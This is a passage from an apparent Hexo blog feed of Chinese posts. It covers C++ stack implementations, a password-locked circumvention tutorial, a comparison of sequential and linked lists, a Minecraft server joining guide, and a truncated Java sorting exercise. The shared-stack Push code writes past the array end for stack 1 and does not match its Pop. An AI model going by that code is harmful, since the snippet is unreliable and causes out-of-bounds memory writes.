class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    e = S.data[S.top]; <span class="comment">//返回栈顶元素</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由静态数组定义的栈空间，使用结束后系统会自动回收。</p></blockquote><h2 id="共享栈的定义"><a href="#共享栈的定义" class="headerlink" title="共享栈的定义"></a>共享栈的定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10 <span class="comment">//栈容量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> top0; <span class="comment">//0号栈顶</span></span><br><span class="line">    <span class="type">int</span> top1; <span class="comment">//1号栈顶</span></span><br><span class="line">&#125;ShareStack;</span><br></pre></td></tr></table></figure><p>共享栈的初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化共享栈</span></span><br><span class="line"><span class="comment"> * @param &#123;ShareStack&amp;&#125; S</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(ShareStack&amp; S)</span> </span>&#123;</span><br><span class="line">    S.top0 = <span class="number">-1</span>; <span class="comment">//初始化0号栈顶</span></span><br><span class="line">    S.top1 = MaxSize; <span class="comment">//初始化1号栈顶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共享栈判空:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 共享栈判空</span></span><br><span class="line"><span class="comment"> * @param &#123;ShareStack&#125; S 共享栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; type 共享栈类型(0号还是1号)</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(ShareStack S, <span class="type">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span>) &#123; <span class="comment">//0号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top0 == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">1</span>) &#123; <span class="comment">//1号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top1 == MaxSize) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共享栈入栈:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 共享栈入栈</span></span><br><span class="line"><span class="comment"> * @param &#123;ShareStack&amp;&#125; S 共享栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; type 共享栈类型</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e 入栈元素</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(ShareStack&amp; S,<span class="type">int</span> type, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span>) &#123; <span class="comment">//0号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top0 + <span class="number">1</span> == S.top1 ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;共享栈已满&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        S.top0++;</span><br><span class="line">        S.data[S.top0] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">1</span>) &#123; <span class="comment">//1号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top0 + <span class="number">1</span> == S.top1 ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;共享栈已满&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        S.data[S.top1] = e;</span><br><span class="line">        S.top1--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共享栈出栈:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 共享栈出栈</span></span><br><span class="line"><span class="comment"> * @param &#123;ShareStack&amp;&#125; S 共享栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; type 共享栈类型</span></span><br><span class="line"><span class="comment"> * @param &#123;int&amp;&#125; e 出栈元素</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(ShareStack&amp; S, <span class="type">int</span> type, <span class="type">int</span>&amp; e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span>) &#123; <span class="comment">//0号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top0 == <span class="number">-1</span> ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;共享栈为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        e = S.data[S.top0];</span><br><span class="line">        S.top0--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">1</span>) &#123; <span class="comment">//1号栈</span></span><br><span class="line">        <span class="keyword">if</span> (S.top1 == MaxSize) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;共享栈为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        e = S.data[--S.top1];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由静态数组定义的栈空间，使用结束后系统会自动回收。</p></blockquote><h2 id="链式存储的栈"><a href="#链式存储的栈" class="headerlink" title="链式存储的栈"></a>链式存储的栈</h2><p>​    采用链式存储的栈称为<code>链栈</code>，链栈的有点是便于多个栈共享存储空间和提高其效率，且不存在栈满上溢的情况。通常采用单链表实现，并规定所有操作都是在单链表的表头进行的。这规定链栈没有头节点，LHead指向栈顶元素。</p><p>链栈的定义:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Linknode</span>&#123;</span><br><span class="line">  <span class="type">int</span> data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Linknode</span> *next;</span><br><span class="line">&#125;*LinkStack;</span><br></pre></td></tr></table></figure><blockquote><p>采用链式存储，便于结点的插入与删除。链栈道操作与链表类似，入栈和出栈的操作都在链表的表头进行（头插法）。</p><p>需要注意的是不带头节点和带头节点的链栈道具体实现会有所不同。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全平台科学上网教程</title>
      <link href="/2022/06/21/bb111db7b763-q1jun/"/>
      <url>/2022/06/21/bb111db7b763-q1jun/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重新输入" data-whm="这些解密的内容无法验证，但您仍然可以查看。">  <script id="hbeData" type="hbeData" data-hmacdigest="8aef0965c0952e396dcf4f1282b78460c0ab6114c5c458eb6a17f4619e7af925"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码来阅读该文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]顺序表和链表的比较</title>
      <link href="/2022/06/20/10484c918977-q1jun/"/>
      <url>/2022/06/20/10484c918977-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h1><h2 id="0x01-存取-x2F-读写方式"><a href="#0x01-存取-x2F-读写方式" class="headerlink" title="0x01 存取&#x2F;读写方式"></a>0x01 存取&#x2F;读写方式</h2><h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>可以顺序存取，也可以随机存取，只需要访问一次。时间复杂度：$O(1)$</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>只能从头顺序读取元素。时间复杂度：$O(n)$</p><h2 id="0x02-逻辑结构和物理结构"><a href="#0x02-逻辑结构和物理结构" class="headerlink" title="0x02 逻辑结构和物理结构"></a>0x02 逻辑结构和物理结构</h2><h3 id="顺序表-1"><a href="#顺序表-1" class="headerlink" title="顺序表"></a>顺序表</h3><p>采用<code>顺序结构</code>，逻辑上相邻的元素，对应的物理存储位置也相邻。</p><h3 id="链表-1"><a href="#链表-1" class="headerlink" title="链表"></a>链表</h3><p>采用<code>链式结构</code>，逻辑结构上相邻的元素，物理位置不一定不一定相邻，对应的逻辑关系是用指针来表示的。</p><h2 id="0x03-CRUD操作"><a href="#0x03-CRUD操作" class="headerlink" title="0x03 CRUD操作"></a>0x03 CRUD操作</h2><h3 id="顺序表-2"><a href="#顺序表-2" class="headerlink" title="顺序表"></a>顺序表</h3><p>对于<code>按值</code>查找，顺序表无序时时间复杂度：$O(n)$，有序时可用折半&#x2F;二分查找，时间复杂度：$O(log_2n)$；</p><p>对于<code>按位</code>查找，顺序表支持随机存取，时间复杂度为：$O(1)$;</p><h3 id="链表-2"><a href="#链表-2" class="headerlink" title="链表"></a>链表</h3><p>对于<code>按值</code>查找，链表的时间复杂度为：$O(n)$;</p><p>对于<code>按位</code>查找，链表的时间复杂度也为：$O(n)$；</p><blockquote><p>由于顺序表在<code>物理结构</code>上也是连续存放的，在进行<code>插入</code>和<code>删除</code>操作时需要挪动大量数据，造成执行效率低下。</p><p>所以在大量数据的情况下适合使用链表进行存储。</p></blockquote><h2 id="0x04-空间分配"><a href="#0x04-空间分配" class="headerlink" title="0x04 空间分配"></a>0x04 空间分配</h2><p>  顺序存储在静态存储分配情形下，一旦存储空间装满就不能扩充，若再加入新元素，则会出现内存溢出，因此需要预先分配足够大的存储空间。预先分配过大，可能会导致顺序表后部大量闲置；预先分配过小，又会造成溢出。动态存储分配虽然存储空间可以扩充，但需要移动大量元素，导致操作效率降低，而且若内存中没有更大块的连续存储空间，则会导致分配失败。链式存储的结点空间值在需要时申请分配，只要内存有空间就可以分配，操作灵活、高效。</p><blockquote><p>在实际中需要考虑的因素：</p><ul><li>基于<code>存储</code>的考虑：<ul><li>难以估计线性表的长度或存储规模时，不宜采用顺序表。</li><li>链表不用事先估计存储规模，但链表的存储密度较低，显然链式存储结构的存储密度时小于1的。</li></ul></li><li>基于<code>运算</code>的考虑：<ul><li>在顺序表中按序号访问$a_i$的时间复杂度为$O(1)$,而链表中按序号访问的时间复杂度为$O(n)$，因此若经常做的运算时按序号访问数据元素，则显然顺序表优于链表。</li><li>在顺序表中进行插入、删除操作时，平均移动表中一半的元素，当数据元素的信息量较大且表较长时，这一点是不应该忽视的。</li><li>在链表中进行插入、删除操作时，虽然也要找插入位置，但操作主要还是比较操作，从这个角度考虑显然链表优于顺序表。</li></ul></li><li>基于<code>环境</code>的考虑：<ul><li>顺序表容易实现，任何高级语言中都有数组类型。</li><li>链表的操作时基于指针的，相对来讲，前者实现较为简单。</li></ul></li></ul><blockquote><p>通常较<code>稳定</code>的线性表选择顺序存储，频繁<code>插入、删除</code>的线性表选择链式存储。</p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[花椒生存]进入服务器萌新教程</title>
      <link href="/2022/06/08/4bb38b6bcdc4-q1jun/"/>
      <url>/2022/06/08/4bb38b6bcdc4-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="花椒生存萌新教程"><a href="#花椒生存萌新教程" class="headerlink" title="花椒生存萌新教程"></a>花椒生存萌新教程</h1><blockquote><p>服务器地址：mc.q1jun.cn</p><p>服务器交流群: 912457864</p><p>服务器语音: <a target="_blank" rel="noopener" href="https://kaihei.co/V0aEIh">https://kaihei.co/V0aEIh</a></p></blockquote><h2 id="0x01-安装我的世界"><a href="#0x01-安装我的世界" class="headerlink" title="0x01 安装我的世界"></a>0x01 安装我的世界</h2><blockquote><p>如果你已经安装了我的世界(Java)1.18.1版本则可以跳过这步。</p></blockquote><h3 id="0x0101-配置Java-17环境"><a href="#0x0101-配置Java-17环境" class="headerlink" title="0x0101 配置Java 17环境"></a>0x0101 配置Java 17环境</h3><p>我的世界<code>1.18.1</code>版本是在<code>Java 17</code>环境下运行的，如<code>Java 16</code>、<code>Java 8</code>等都不能运行。</p><p><strong>查看Java版本的方法：</strong></p><p><kbd>Win</kbd>+<kbd>R</kbd>输入cmd，打开命令行界面输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p>回车，若显示如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;17.0.1&quot; 2021-10-19 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.1+12-LTS-39)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.1+12-LTS-39, mixed mode, sharing)</span><br></pre></td></tr></table></figure><p>则说明是<code>Java 17.0.1</code>，恭喜你，可以运行<code>1.18.1</code>版本！</p><p>如果不是Java 17，则需要重新安装Java环境，或者通过其他MC启动器辅助安装（略，参考搜索引擎）。</p><blockquote><p>Java 17下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/#jdk17-windows">https://www.oracle.com/java/technologies/downloads/#jdk17-windows</a></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220610125122802.png" alt="image-20220610125122802"></p></blockquote><h3 id="0x0102-运行我的世界"><a href="#0x0102-运行我的世界" class="headerlink" title="0x0102 运行我的世界"></a>0x0102 运行我的世界</h3><h4 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1. 新建文件夹"></a>1. 新建文件夹</h4><p>新建一个文件夹，用于存放我的世界游戏：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608165233355.png" alt="image-20220608165233355"></p><h4 id="2-下载启动器"><a href="#2-下载启动器" class="headerlink" title="2. 下载启动器"></a>2. 下载启动器</h4><blockquote><p>可以使用官方启动器，但是官方启动器经常更新，且对网络环境要求较高（校园网就不要想了）。</p></blockquote><p>建议使用<code>HMCL</code>(群文件自取)，当然你也可以使用其他的启动器如<code>PCL</code>。</p><p>将启动器丢入新建的文件夹中：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608165609230.png" alt="image-20220608165609230"></p><h4 id="3-新建角色"><a href="#3-新建角色" class="headerlink" title="3. 新建角色"></a>3. 新建角色</h4><p>点击左上角的账户：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608165652456.png" alt="image-20220608165652456"></p><p>添加一个ID：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608165705985.png" alt="image-20220608165705985"></p><blockquote><p>如果没有正版请选择离线模式，有正版选择Mojang登入或者微软登入。</p><p>2022年6月7日开始Java和基岩版捆绑销售，原来有其中一个版本将免费获得另一个版本，且售价降低很多，建议购买正版支持我的世界。</p><p>离线用户无法自己更换皮肤。</p><p>离线用户的用户名请不要使用中文，3-16个英文字符即可，可包括下划线。</p></blockquote><p>设置你的游戏名：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170005967.png" alt="image-20220608170005967"></p><h4 id="4-创建1-18-1游戏版本"><a href="#4-创建1-18-1游戏版本" class="headerlink" title="4. 创建1.18.1游戏版本"></a>4. 创建1.18.1游戏版本</h4><p>返回启动器主页，点击下载游戏版本：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170059353.png" alt="image-20220608170059353"></p><p>选择<code>1.18.1</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170112912.png" alt="image-20220608170112912"></p><p>选择拓展包：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170124552.png" alt="image-20220608170124552"></p><blockquote><p>如果想要添加mod可以选择安装Forge或者Fabric，服务器不需要mod，所以可以不选。</p><p>建议勾选OptiFine，可以增加游戏体验（显示更清晰，可添加光影）。</p></blockquote><p>点击开始安装：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170252474.png" alt="image-20220608170252474"></p><p>等待启动器下载完成：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170305448.png" alt="image-20220608170305448"></p><h4 id="5-游戏设置"><a href="#5-游戏设置" class="headerlink" title="5. 游戏设置"></a>5. 游戏设置</h4><p>返回启动器主页，点击<code>设置</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170355214.png" alt="image-20220608170355214"></p><p>选择Java版本，确认是<code>Java 17</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170417567.png" alt="image-20220608170417567"></p><blockquote><p>也可以根据电脑情况设置给游戏分配的内存。</p><p>如果内存分配太小会导致闪退、无法启动的情况。</p></blockquote><h4 id="6-启动游戏"><a href="#6-启动游戏" class="headerlink" title="6. 启动游戏"></a>6. 启动游戏</h4><p>返回启动器主页，点击启动游戏(注意下方是否为<code>1.18.1</code>)：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170532131.png" alt="image-20220608170532131"></p><p>等待它启动就好啦：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170734507.png" alt="image-20220608170734507"></p><h2 id="0x02-进入服务器"><a href="#0x02-进入服务器" class="headerlink" title="0x02 进入服务器"></a>0x02 进入服务器</h2><blockquote><p>等待游戏启动成功之后就是进入<code>花椒生存</code>服务器啦，服务器IP地址:<code>mc.q1jun.cn</code>。</p></blockquote><p>点击多人游戏：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170906573.png" alt="image-20220608170906573"></p><p>选择<code>添加服务器</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608170949533.png" alt="image-20220608170949533"></p><p>输入我们服务器的地址<code>mc.q1jun.cn</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608171012235.png" alt="image-20220608171012235"></p><p>点击<code>完成</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608171027851.png" alt="image-20220608171027851"></p><p>双击即可进入服务器啦！</p><h4 id="0x0201-注册账号"><a href="#0x0201-注册账号" class="headerlink" title="0x0201 注册账号"></a>0x0201 注册账号</h4><blockquote><p>进入服务器之后你还无法走动，因为你需要给你的游戏用户名设置一个密码。</p></blockquote><p>第一次登入需要 <strong>注册</strong> ：</p><p>按键盘中的<kbd>T</kbd>或者<kbd>/</kbd>打开聊天输入框，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/register &lt;你的密码&gt; &lt;确认密码&gt;</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/reg &lt;你的密码&gt; &lt;确认密码&gt;</span><br></pre></td></tr></table></figure><p><code>/reg</code>是<code>/register</code>的简写，效果相同。</p><p>注册成功之后如果你再进入服务器则不需要再注册了，而是需要 <strong>登入</strong> ：</p><p>按键盘中的<kbd>T</kbd>或者<kbd>/</kbd>打开聊天输入框，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login &lt;你的密码&gt;</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/l &lt;你的密码&gt;</span><br></pre></td></tr></table></figure><p>登入成功界面：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608171758797.png" alt="image-20220608171758797"></p><h4 id="0x0202-领取新手礼包"><a href="#0x0202-领取新手礼包" class="headerlink" title="0x0202 领取新手礼包"></a>0x0202 领取新手礼包</h4><p>第一次进入服务器可以领取<code>新手礼包</code>,在主城右键“它”就可以了：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608171933527.png" alt="image-20220608171933527"></p><p>在获得的物品中会有一个<code>服务器菜单</code>，拿在手上右键可以打开菜单：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220608172024321.png" alt="image-20220608172024321"></p><blockquote><p>菜单提供：</p><ul><li>传送菜单</li><li>结婚功能</li><li>称号功能</li><li>黏液科技(好玩的插件)</li><li>全球市场(全服交易物品)</li><li>地皮系统</li><li>宠物系统</li><li>等等……</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> 花椒生存 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Minecraft </tag>
            
            <tag> 我的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java接口实现插入和冒泡排序</title>
      <link href="/2022/05/27/40979a038876-q1jun/"/>
      <url>/2022/05/27/40979a038876-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Java接口实现插入和冒泡排序"><a href="#Java接口实现插入和冒泡排序" class="headerlink" title="Java接口实现插入和冒泡排序"></a>Java接口实现插入和冒泡排序</h1><h2 id="0x01-要求"><a href="#0x01-要求" class="headerlink" title="0x01 要求"></a>0x01 要求</h2><p>对整型数组排序的静态方法代码如下：</p><blockquote><p>class SortedInts {</p><p>  public static void newsort(int[] numbers, SortMethod s) {    </p><p>​    s.sort(numbers);</p><p>​    for (int n : numbers) {</p><p>​      System.out.printf(“%d “, n);</p><p>​    }</p><p>​    System.out.println();</p><p>  }</p><p>}</p></blockquote><p>其中SortMethod是一个接口，请定义该接口，并定义2个类InsertSort和BubbleSort实现该接口，分别在这两个实现类中使用直接插入排序和冒泡排序实现 sort 方法。</p><p>对数组 a 进行直接插入排序的算法如下：</p><blockquote><p>for (int i &#x3D; 1; i &lt; a.length; i++) {  </p><p>​    int key &#x3D; a[i];</p><p>​    int j &#x3D; i - 1;</p><p>​    while (j &gt;&#x3D; 0 &amp;&amp; a[j] &gt; key) {</p><p>​      a[j+1] &#x3D; a[j];</p><p>​      j–;</p><p>​    }</p><p>​    a[j+1] &#x3D; key;</p><p>}</p></blockquote><p>对数组 a 进行冒泡排序的算法如下：</p><blockquote><p>for (int i &#x3D; 0; i &lt; a.length - 1; i++) {</p><p>​    for (int j &#x3D; 0; j &lt; a.length - 1 - i; j++) {</p><p>​      if (a[j] &gt; a[j + 1]) {</p><p>​        int temp;</p><p>​        temp &#x3D; a[j];</p><p>​        a[j] &#x3D; a[j + 1];</p><p>​        a[j + 1] &#x3D; temp;</p><p>​      }</p><p>​    }</p><p>}</p></blockquote><p>然后在main方法中输入一个长度为8的数组，分别用两个实现类的对象作为实际参数调用newsort方法进行排序。例如：</p><blockquote><p>public class Main {</p><p>  public static void main(String[] args) {</p><p>​    int[] ns &#x3D; new int[8];</p><p>​    ……  &#x2F;&#x2F; 输入数组</p><p>​    InsertSort is &#x3D; new InsertSort();</p><p>​    SortedInts.newsort(ns, is);</p><p>​    BubbleSort bs &#x3D; new BubbleSort();</p><p>​    SortedInts.newsort(ns, bs);    </p><p>  }</p><p>}</p></blockquote><p>输入样例：</p><blockquote><p>9 3 5 2 1 7 23 8 </p></blockquote><p>输出样例：</p><blockquote><p>1 2 3 5 7 8 9 23</p><p>1 2 3 5 7 8 9 23</p></blockquote><p>提示：本次上机需要定义1个接口，4个类。必须将类 Main 定义为 public 并放在最前面，其他类和接口不能定义为 public。类 SortedInts 的代码不能更改。</p><h2 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 